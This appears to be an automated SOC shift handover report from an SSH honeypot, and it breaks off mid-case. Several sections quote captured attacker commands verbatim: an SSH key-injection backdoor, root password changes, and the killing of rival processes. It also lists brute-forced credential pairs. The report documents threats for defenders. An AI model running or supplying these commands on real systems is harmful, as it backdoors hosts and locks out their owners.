# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-05 |
| **Generated At** | 2026-04-05T20:31:06Z |
| **Shift Time** | 20:31 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **174** |
| Confirmed Threats | **97** |
| False Positives Filtered | **77** (44.2%) |
| Unique Attacker IPs | **12** |
| Countries of Origin | **6** |
| High Severity Cases | **29** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **145** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **71** |
| Unique Credential Pairs | **42** |
| Unique Usernames | **20** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **19** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 29 |
| `345gs5662d34` | 13 |
| `ftpuser` | 4 |
| `frappe` | 3 |
| `test` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `rootroot` | 2 |
| `Ftpuser!` | 2 |
| `p@ssw0rd` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `root` | `3245gs5662d34` | 13 |
| `git` | `rootroot` | 2 |
| `ftpuser` | `Ftpuser!` | 2 |
| `ftpuser` | `p@ssw0rd` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Abcd!@#$%` | `117.6.44.221` | 2026-04-05T19:52:51 |
| `root` | `3245gs5662d34` | `117.6.44.221` | 2026-04-05T19:52:54 |
| `root` | `qazwsx2023@#` | `115.190.24.136` | 2026-04-05T19:54:58 |
| `root` | `PASSWORD` | `180.76.105.16` | 2026-04-05T20:01:40 |
| `root` | `qwer12345678` | `102.88.137.80` | 2026-04-05T20:06:35 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-04-05T20:06:42 |
| `root` | `5tgbNHY^` | `74.91.224.229` | 2026-04-05T20:07:40 |
| `root` | `Root18!` | `102.88.137.80` | 2026-04-05T20:07:42 |
| `root` | `3245gs5662d34` | `74.91.224.229` | 2026-04-05T20:07:42 |
| `root` | `Aa11111111` | `74.91.224.229` | 2026-04-05T20:10:02 |
| `root` | `login123` | `74.91.224.229` | 2026-04-05T20:12:17 |
| `root` | `P@sssw0rd` | `102.88.137.80` | 2026-04-05T20:13:55 |
| `root` | `5tgbNHY^` | `180.76.105.16` | 2026-04-05T20:14:46 |
| `root` | `1qwerty` | `102.88.137.80` | 2026-04-05T20:15:01 |
| `root` | `Jh123456` | `102.88.137.80` | 2026-04-05T20:16:07 |
| `root` | `cxthhhhh.com` | `102.88.137.80` | 2026-04-05T20:18:19 |
| `root` | `Aa888888` | `102.88.137.80` | 2026-04-05T20:19:22 |
| `root` | `@Tx123456` | `74.91.224.229` | 2026-04-05T20:26:07 |
| `root` | `a1234567891011121314151617181920` | `102.88.137.80` | 2026-04-05T20:30:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **174** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 96 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 51 | 6 |
| `713bd9cc9355...` | Mirai/variant | 40 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 51 | 6 | Modern SSH client |
| `713bd9cc9355...` | libssh | 40 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:e9Yk20G5HAok"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.105.16`, `115.190.24.136`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `117.6.44.221`, `102.88.137.80`, `74.91.224.229`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **12** |
| Unique ASNs | **11** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS151823` | China Telecom | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS139879` | Galaxy Broadband | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (29)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ba4b3cd78439

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-05 19:52 |
| **Last Seen** | 2026-04-05 19:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 19:52:51` | `cowrie.session.connect` |
| `2026-04-05 19:52:51` | `cowrie.client.version` |
| `2026-04-05 19:52:51` | `cowrie.client.kex` |
| `2026-04-05 19:52:51` | `cowrie.login.success` |
| `2026-04-05 19:52:52` | `cowrie.session.params` |
| `2026-04-05 19:52:52` | `cowrie.command.input` |
| `2026-04-05 19:52:52` | `cowrie.command.failed` |
| `2026-04-05 19:52:52` | `cowrie.log.closed` |
| `2026-04-05 19:52:52` | `cowrie.session.params` |
| `2026-04-05 19:52:52` | `cowrie.command.input` |
| `2026-04-05 19:52:52` | `cowrie.session.file_download` |
| `2026-04-05 19:52:52` | `cowrie.log.closed` |
| `2026-04-05 19:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95af2441792

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-05 19:52 |
| **Last Seen** | 2026-04-05 19:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 19:52:54` | `cowrie.session.connect` |
| `2026-04-05 19:52:54` | `cowrie.client.version` |
| `2026-04-05 19:52:54` | `cowrie.client.kex` |
| `2026-04-05 19:52:54` | `cowrie.login.success` |
| `2026-04-05 19:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41c9be677f21

| Field | Detail |
|---|---|
| **Source IP** | `115.190.24[.]136` |
| **First Seen** | 2026-04-05 19:54 |
| **Last Seen** | 2026-04-05 19:55 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:e9Yk20G5HAok"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 19:54:57` | `cowrie.session.connect` |
| `2026-04-05 19:54:57` | `cowrie.client.version` |
| `2026-04-05 19:54:57` | `cowrie.client.kex` |
| `2026-04-05 19:54:58` | `cowrie.login.success` |
| `2026-04-05 19:54:58` | `cowrie.session.params` |
| `2026-04-05 19:54:58` | `cowrie.command.input` |
| `2026-04-05 19:54:58` | `cowrie.command.failed` |
| `2026-04-05 19:54:58` | `cowrie.log.closed` |
| `2026-04-05 19:54:59` | `cowrie.session.params` |
| `2026-04-05 19:54:59` | `cowrie.command.input` |
| `2026-04-05 19:54:59` | `cowrie.session.file_download` |
| `2026-04-05 19:54:59` | `cowrie.log.closed` |
| `2026-04-05 19:55:16` | `cowrie.session.params` |
| `2026-04-05 19:55:16` | `cowrie.command.input` |
| `2026-04-05 19:55:16` | `cowrie.log.closed` |
| `2026-04-05 19:55:16` | `cowrie.session.params` |
| `2026-04-05 19:55:16` | `cowrie.command.input` |
| `2026-04-05 19:55:16` | `cowrie.log.closed` |
| `2026-04-05 19:55:17` | `cowrie.session.params` |
| `2026-04-05 19:55:17` | `cowrie.command.input` |
| `2026-04-05 19:55:17` | `cowrie.session.file_download` |
| `2026-04-05 19:55:17` | `cowrie.log.closed` |
| `2026-04-05 19:55:17` | `cowrie.session.params` |
| `2026-04-05 19:55:17` | `cowrie.command.input` |
| `2026-04-05 19:55:17` | `cowrie.log.closed` |
| `2026-04-05 19:55:18` | `cowrie.session.params` |
| `2026-04-05 19:55:18` | `cowrie.command.input` |
| `2026-04-05 19:55:18` | `cowrie.log.closed` |
| `2026-04-05 19:55:18` | `cowrie.session.params` |
| `2026-04-05 19:55:18` | `cowrie.command.input` |
| `2026-04-05 19:55:18` | `cowrie.command.input` |
| `2026-04-05 19:55:18` | `cowrie.log.closed` |
| `2026-04-05 19:55:19` | `cowrie.session.params` |
| `2026-04-05 19:55:19` | `cowrie.command.input` |
| `2026-04-05 19:55:19` | `cowrie.log.closed` |
| `2026-04-05 19:55:19` | `cowrie.session.params` |
| `2026-04-05 19:55:19` | `cowrie.command.input` |
| `2026-04-05 19:55:19` | `cowrie.log.closed` |
| `2026-04-05 19:55:20` | `cowrie.session.params` |
| `2026-04-05 19:55:20` | `cowrie.command.input` |
| `2026-04-05 19:55:20` | `cowrie.log.closed` |
| `2026-04-05 19:55:20` | `cowrie.session.params` |
| `2026-04-05 19:55:20` | `cowrie.command.input` |
| `2026-04-05 19:55:20` | `cowrie.log.closed` |
| `2026-04-05 19:55:21` | `cowrie.session.params` |
| `2026-04-05 19:55:21` | `cowrie.command.input` |
| `2026-04-05 19:55:21` | `cowrie.log.closed` |
| `2026-04-05 19:55:21` | `cowrie.session.params` |
| `2026-04-05 19:55:21` | `cowrie.command.input` |
| `2026-04-05 19:55:21` | `cowrie.log.closed` |
| `2026-04-05 19:55:22` | `cowrie.session.params` |
| `2026-04-05 19:55:22` | `cowrie.command.input` |
| `2026-04-05 19:55:22` | `cowrie.log.closed` |
| `2026-04-05 19:55:22` | `cowrie.session.params` |
| `2026-04-05 19:55:22` | `cowrie.command.input` |
| `2026-04-05 19:55:22` | `cowrie.log.closed` |
| `2026-04-05 19:55:23` | `cowrie.session.params` |
| `2026-04-05 19:55:23` | `cowrie.command.input` |
| `2026-04-05 19:55:23` | `cowrie.log.closed` |
| `2026-04-05 19:55:23` | `cowrie.session.params` |
| `2026-04-05 19:55:23` | `cowrie.command.input` |
| `2026-04-05 19:55:23` | `cowrie.log.closed` |
| `2026-04-05 19:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.24[.]136` to AbuseIPDB if not already reported
- [ ] Block `115.190.24[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8f2d3ac409d

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]16` |
| **First Seen** | 2026-04-05 20:01 |
| **Last Seen** | 2026-04-05 20:02 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1zPT44X7fDsc"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:01:36` | `cowrie.session.connect` |
| `2026-04-05 20:01:36` | `cowrie.client.version` |
| `2026-04-05 20:01:37` | `cowrie.client.kex` |
| `2026-04-05 20:01:40` | `cowrie.login.success` |
| `2026-04-05 20:01:44` | `cowrie.session.params` |
| `2026-04-05 20:01:44` | `cowrie.command.input` |
| `2026-04-05 20:01:44` | `cowrie.command.failed` |
| `2026-04-05 20:01:44` | `cowrie.log.closed` |
| `2026-04-05 20:01:45` | `cowrie.session.params` |
| `2026-04-05 20:01:45` | `cowrie.command.input` |
| `2026-04-05 20:01:48` | `cowrie.session.file_download` |
| `2026-04-05 20:01:48` | `cowrie.log.closed` |
| `2026-04-05 20:02:05` | `cowrie.session.params` |
| `2026-04-05 20:02:05` | `cowrie.command.input` |
| `2026-04-05 20:02:06` | `cowrie.log.closed` |
| `2026-04-05 20:02:06` | `cowrie.session.params` |
| `2026-04-05 20:02:06` | `cowrie.command.input` |
| `2026-04-05 20:02:06` | `cowrie.log.closed` |
| `2026-04-05 20:02:07` | `cowrie.session.params` |
| `2026-04-05 20:02:07` | `cowrie.command.input` |
| `2026-04-05 20:02:08` | `cowrie.session.file_download` |
| `2026-04-05 20:02:08` | `cowrie.log.closed` |
| `2026-04-05 20:02:08` | `cowrie.session.params` |
| `2026-04-05 20:02:08` | `cowrie.command.input` |
| `2026-04-05 20:02:08` | `cowrie.log.closed` |
| `2026-04-05 20:02:09` | `cowrie.session.params` |
| `2026-04-05 20:02:09` | `cowrie.command.input` |
| `2026-04-05 20:02:09` | `cowrie.log.closed` |
| `2026-04-05 20:02:10` | `cowrie.session.params` |
| `2026-04-05 20:02:10` | `cowrie.command.input` |
| `2026-04-05 20:02:10` | `cowrie.command.input` |
| `2026-04-05 20:02:11` | `cowrie.log.closed` |
| `2026-04-05 20:02:11` | `cowrie.session.params` |
| `2026-04-05 20:02:11` | `cowrie.command.input` |
| `2026-04-05 20:02:11` | `cowrie.log.closed` |
| `2026-04-05 20:02:12` | `cowrie.session.params` |
| `2026-04-05 20:02:12` | `cowrie.command.input` |
| `2026-04-05 20:02:12` | `cowrie.log.closed` |
| `2026-04-05 20:02:13` | `cowrie.session.params` |
| `2026-04-05 20:02:13` | `cowrie.command.input` |
| `2026-04-05 20:02:13` | `cowrie.log.closed` |
| `2026-04-05 20:02:14` | `cowrie.session.params` |
| `2026-04-05 20:02:14` | `cowrie.command.input` |
| `2026-04-05 20:02:15` | `cowrie.log.closed` |
| `2026-04-05 20:02:16` | `cowrie.session.params` |
| `2026-04-05 20:02:16` | `cowrie.command.input` |
| `2026-04-05 20:02:16` | `cowrie.log.closed` |
| `2026-04-05 20:02:17` | `cowrie.session.params` |
| `2026-04-05 20:02:17` | `cowrie.command.input` |
| `2026-04-05 20:02:17` | `cowrie.log.closed` |
| `2026-04-05 20:02:19` | `cowrie.session.params` |
| `2026-04-05 20:02:19` | `cowrie.command.input` |
| `2026-04-05 20:02:20` | `cowrie.log.closed` |
| `2026-04-05 20:02:20` | `cowrie.session.params` |
| `2026-04-05 20:02:20` | `cowrie.command.input` |
| `2026-04-05 20:02:20` | `cowrie.log.closed` |
| `2026-04-05 20:02:21` | `cowrie.session.params` |
| `2026-04-05 20:02:21` | `cowrie.command.input` |
| `2026-04-05 20:02:21` | `cowrie.log.closed` |
| `2026-04-05 20:02:21` | `cowrie.session.params` |
| `2026-04-05 20:02:21` | `cowrie.command.input` |
| `2026-04-05 20:02:22` | `cowrie.log.closed` |
| `2026-04-05 20:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]16` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]16` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cd009f5eb82

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:06 |
| **Last Seen** | 2026-04-05 20:06 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:06:33` | `cowrie.session.connect` |
| `2026-04-05 20:06:33` | `cowrie.client.version` |
| `2026-04-05 20:06:34` | `cowrie.client.kex` |
| `2026-04-05 20:06:35` | `cowrie.login.success` |
| `2026-04-05 20:06:36` | `cowrie.session.params` |
| `2026-04-05 20:06:36` | `cowrie.command.input` |
| `2026-04-05 20:06:36` | `cowrie.command.failed` |
| `2026-04-05 20:06:36` | `cowrie.log.closed` |
| `2026-04-05 20:06:37` | `cowrie.session.params` |
| `2026-04-05 20:06:37` | `cowrie.command.input` |
| `2026-04-05 20:06:37` | `cowrie.session.file_download` |
| `2026-04-05 20:06:37` | `cowrie.log.closed` |
| `2026-04-05 20:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14e3d504ae70

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:06 |
| **Last Seen** | 2026-04-05 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:06:40` | `cowrie.session.connect` |
| `2026-04-05 20:06:40` | `cowrie.client.version` |
| `2026-04-05 20:06:41` | `cowrie.client.kex` |
| `2026-04-05 20:06:42` | `cowrie.login.success` |
| `2026-04-05 20:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f78b2adc691

| Field | Detail |
|---|---|
| **Source IP** | `74.91.224[.]229` |
| **First Seen** | 2026-04-05 20:07 |
| **Last Seen** | 2026-04-05 20:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-05 20:07:39` | `cowrie.session.connect` |
| `2026-04-05 20:07:39` | `cowrie.client.version` |
| `2026-04-05 20:07:39` | `cowrie.client.kex` |
| `2026-04-05 20:07:40` | `cowrie.login.success` |
| `2026-04-05 20:07:40` | `cowrie.session.params` |
| `2026-04-05 20:07:40` | `cowrie.command.input` |
| `2026-04-05 20:07:40` | `cowrie.command.failed` |
| `2026-04-05 20:07:40` | `cowrie.log.closed` |
| `2026-04-05 20:07:40` | `cowrie.session.params` |
| `2026-04-05 20:07:40` | `cowrie.command.input` |
| `2026-04-05 20:07:40` | `cowrie.session.file_download` |
| `2026-04-05 20:07:40` | `cowrie.log.closed` |
| `2026-04-05 20:07:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.91.224[.]229` to AbuseIPDB if not already reported
- [ ] Block `74.91.224[.]229` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c997c10c67e8

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-04-05 20:07 |
| **Last Seen** | 2026-04-05 20:07 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
